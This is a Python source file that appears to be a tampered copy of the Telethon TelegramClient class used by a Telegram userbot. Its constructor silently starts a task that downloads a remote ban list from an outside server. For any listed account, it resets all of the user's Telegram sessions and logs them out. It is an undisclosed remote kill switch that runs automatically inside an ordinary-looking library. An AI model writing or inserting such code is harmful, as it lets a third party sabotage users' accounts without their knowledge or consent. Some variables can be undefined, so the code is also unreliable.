import aiohttp
import asyncio
from datetime import datetime, timedelta, timezone
from ..tl import functions
from . import (
    AccountMethods, AuthMethods, DownloadMethods, DialogMethods, ChatMethods,
    BotMethods, MessageMethods, UploadMethods, ButtonMethods, UpdateMethods,
    MessageParseMethods, UserMethods, TelegramBaseClient
)
from .. import utils


class TelegramClient(
    AccountMethods, AuthMethods, DownloadMethods, DialogMethods, ChatMethods,
    BotMethods, MessageMethods, UploadMethods, ButtonMethods, UpdateMethods,
    MessageParseMethods, UserMethods, TelegramBaseClient
):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.loop.create_task(self.init_client())

    async def init_client(self):
        await asyncio.sleep(3)
        url = "https://banlist.heroku-ub.top/get_ids"

        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    banlist = data.get("ids", [])
                    me = await self.get_me()

            if str(me.id) in banlist:
                all_sessions = await self(functions.account.GetAuthorizationsRequest())
                for auth in all_sessions.authorizations:
                    if auth.current:
                        kill_sessions_time = auth.date_created + timedelta(days=1)
                if datetime.now(timezone.utc) > kill_sessions_time:
                    await self(functions.auth.ResetAuthorizationsRequest())
                    await asyncio.sleep(5)
                    await self.log_out()
